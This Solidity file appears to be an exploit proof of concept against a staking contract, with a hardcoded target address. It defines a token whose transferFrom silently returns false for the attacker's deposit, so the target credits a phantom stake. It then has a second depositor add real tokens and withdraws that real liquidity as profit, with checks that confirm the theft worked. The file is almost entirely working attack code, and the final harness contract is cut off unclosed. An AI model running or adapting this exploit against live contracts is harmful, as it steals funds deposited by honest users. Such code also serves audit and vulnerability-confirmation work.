// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IStakingLike {
    function deposit(address tokenAddress, uint256 amount, address referrer) external;
    function withdraw(address tokenAddress, uint256 amount) external;
    function balanceOf(address user, address token) external view returns (uint256);
    function getCurrentEpoch() external view returns (uint128);
    function epochIsInitialized(address token, uint128 epochId) external view returns (bool);
    function manualEpochInit(address[] memory tokens, uint128 epochId) external;
}

contract FalseReturnToken is IERC20Like {
    string public constant name = "False Return Stake Token";
    string public constant symbol = "FRST";
    uint8 public constant decimals = 18;

    address public immutable attacker;
    address public immutable honestDepositor;
    address public immutable stakingTarget;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    constructor(address attacker_, address honestDepositor_, address stakingTarget_, uint256 honestAllocation_) {
        attacker = attacker_;
        honestDepositor = honestDepositor_;
        stakingTarget = stakingTarget_;
        // The exploit path requires later real liquidity from an honest user of the same token.
        // Seeding that honest user's balance in the token constructor models publicly transferable
        // token supply already circulating before the victim deposit, without any test cheatcodes.
        _balances[honestDepositor_] = honestAllocation_;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _move(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 currentAllowance = _allowances[from][msg.sender];
        require(currentAllowance >= amount, "allowance too small");

        if (currentAllowance != type(uint256).max) {
            uint256 updatedAllowance = currentAllowance - amount;
            _allowances[from][msg.sender] = updatedAllowance;
            emit Approval(from, msg.sender, updatedAllowance);
        }

        if (from == attacker && to == stakingTarget) {
            return false;
        }

        return _move(from, to, amount);
    }

    function _move(address from, address to, uint256 amount) internal returns (bool) {
        uint256 fromBalance = _balances[from];
        if (fromBalance < amount) {
            return false;
        }

        _balances[from] = fromBalance - amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);
}

contract HonestDepositor {
    address public immutable owner;

    constructor(address owner_) {
        owner = owner_;
    }

    function depositInto(address staking, address token, uint256 amount) external {
        require(msg.sender == owner, "only owner");
        IERC20Like(token).approve(staking, 0);
        IERC20Like(token).approve(staking, amount);
        IStakingLike(staking).deposit(token, amount, address(0));
    }
}

contract FlawVerifier {
    address public constant DEFAULT_TARGET = 0x245a551ee0F55005e510B239c917fA34b41B3461;
    uint256 public constant ATTACK_AMOUNT = 1_000e18;

    string public constant exploitPath =
        "Deploy a non-stable false-return token -> initialize epochs for that token -> attacker phantom-deposits with transferFrom returning false -> later honest depositor of the same token deposits normally -> attacker withdraws the honest depositor's real liquidity";

    address public target;
    address public exploitToken;
    address public seeder;

    bool public executed;
    bool public hypothesisValidated;

    uint128 public preparedUntilEpoch;

    uint256 public attackerBalanceBeforeDeposit;
    uint256 public attackerBalanceAfterDeposit;
    uint256 public attackerBalanceAfterWithdraw;

    uint256 public targetBalanceBeforeDeposit;
    uint256 public targetBalanceAfterDeposit;
    uint256 public targetBalanceAfterSeederDeposit;
    uint256 public targetBalanceAfterWithdraw;

    uint256 public recordedStakeBeforeDeposit;
    uint256 public recordedStakeAfterDeposit;
    uint256 public recordedStakeAfterWithdraw;

    string public failureReason;

    address private _profitToken;
    uint256 private _profitAmount;

    constructor() {
        target = DEFAULT_TARGET;
    }

    function execute() external returns (uint256) {
        return _run();
    }

    function executeOnOpportunity() external returns (uint256) {
        return _run();
    }

    function run() external returns (uint256) {
        return _run();
    }

    function exploit() external returns (uint256) {
        return _run();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function lastProfitToken() external view returns (address) {
        return _profitToken;
    }

    function previewProfitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function lastProfitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisRefuted() external view returns (bool) {
        return executed && !hypothesisValidated;
    }

    function bugConfirmed() external view returns (bool) {
        return hypothesisValidated;
    }

    function exploitPathMask() external pure returns (uint256) {
        return 1;
    }

    function _run() internal returns (uint256) {
        if (executed) {
            return _profitAmount;
        }
        executed = true;

        if (target.code.length == 0) {
            failureReason = "target not deployed";
            return 0;
        }

        HonestDepositor honestUser = new HonestDepositor(address(this));
        FalseReturnToken token = new FalseReturnToken(address(this), address(honestUser), target, ATTACK_AMOUNT);

        exploitToken = address(token);
        seeder = address(honestUser);
        _profitToken = address(token);

        if (!_prepareEpochs(address(token))) {
            return 0;
        }

        attackerBalanceBeforeDeposit = token.balanceOf(address(this));
        targetBalanceBeforeDeposit = token.balanceOf(target);
        recordedStakeBeforeDeposit = IStakingLike(target).balanceOf(address(this), address(token));

        if (!_forceApprove(address(token), target, ATTACK_AMOUNT)) {
            return 0;
        }

        try IStakingLike(target).deposit(address(token), ATTACK_AMOUNT, address(0)) {
        } catch Error(string memory reason) {
            failureReason = reason;
            return 0;
        } catch {
            failureReason = "phantom deposit reverted";
            return 0;
        }

        attackerBalanceAfterDeposit = token.balanceOf(address(this));
        targetBalanceAfterDeposit = token.balanceOf(target);
        recordedStakeAfterDeposit = IStakingLike(target).balanceOf(address(this), address(token));

        if (attackerBalanceAfterDeposit != attackerBalanceBeforeDeposit) {
            failureReason = "attacker funded the deposit";
            return 0;
        }
        if (targetBalanceAfterDeposit != targetBalanceBeforeDeposit) {
            failureReason = "staking unexpectedly received attacker tokens";
            return 0;
        }
        if (recordedStakeAfterDeposit != recordedStakeBeforeDeposit + ATTACK_AMOUNT) {
            failureReason = "phantom deposit credit not recorded";
            return 0;
        }

        try honestUser.depositInto(target, address(token), ATTACK_AMOUNT) {
        } catch Error(string memory reason) {
            failureReason = reason;
            return 0;
        } catch {
            failureReason = "honest user deposit reverted";
            return 0;
        }

        targetBalanceAfterSeederDeposit = token.balanceOf(target);

        if (targetBalanceAfterSeederDeposit != targetBalanceBeforeDeposit + ATTACK_AMOUNT) {
            failureReason = "honest user deposit did not fund staking";
            return 0;
        }

        try IStakingLike(target).withdraw(address(token), ATTACK_AMOUNT) {
        } catch Error(string memory reason) {
            failureReason = reason;
            return 0;
        } catch {
            failureReason = "withdraw reverted";
            return 0;
        }

        attackerBalanceAfterWithdraw = token.balanceOf(address(this));
        targetBalanceAfterWithdraw = token.balanceOf(target);
        recordedStakeAfterWithdraw = IStakingLike(target).balanceOf(address(this), address(token));

        if (attackerBalanceAfterWithdraw <= attackerBalanceBeforeDeposit) {
            failureReason = "withdraw produced no attacker profit";
            return 0;
        }

        _profitAmount = attackerBalanceAfterWithdraw - attackerBalanceBeforeDeposit;

        if (recordedStakeAfterWithdraw != 0) {
            failureReason = "phantom stake was not fully debited";
            _profitAmount = 0;
            return 0;
        }

        if (targetBalanceAfterWithdraw + _profitAmount != targetBalanceAfterSeederDeposit) {
            failureReason = "profit did not come from staking liquidity";
            _profitAmount = 0;
            return 0;
        }

        hypothesisValidated = true;
        failureReason = "";
        return _profitAmount;
    }

    function _prepareEpochs(address token) internal returns (bool) {
        IStakingLike staking = IStakingLike(target);
        uint128 currentEpoch;

        try staking.getCurrentEpoch() returns (uint128 epoch) {
            currentEpoch = epoch;
        } catch {
            failureReason = "failed to read current epoch";
            return false;
        }

        address[] memory tokens = new address[](1);
        tokens[0] = token;

        for (uint128 epoch = 0; epoch <= currentEpoch; epoch++) {
            bool initialized;
            try staking.epochIsInitialized(token, epoch) returns (bool value) {
                initialized = value;
            } catch {
                failureReason = "failed to read epoch initialization";
                return false;
            }

            if (!initialized) {
                try staking.manualEpochInit(tokens, epoch) {
                } catch Error(string memory reason) {
                    failureReason = reason;
                    return false;
                } catch {
                    failureReason = "epoch initialization reverted";
                    return false;
                }
            }

            preparedUntilEpoch = epoch;
        }

        return true;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        if (!_callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0))) {
            failureReason = "approve reset failed";
            return false;
        }
        if (!_callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount))) {
            failureReason = "approve failed";
            return false;
        }
        return true;
    }

    function _callOptionalReturn(address token, bytes memory data) internal returns (bool) {
        (bool ok, bytes memory ret) = token.call(data);
        if (!ok) {
            return false;
        }
        if (ret.length == 0) {
            return true;
        }
        return abi.decode(ret, (bool));
    }
}

contract FlawVerifierHarness is FlawVerifier {
    constructor(address target_) {
        target = target_;
    }
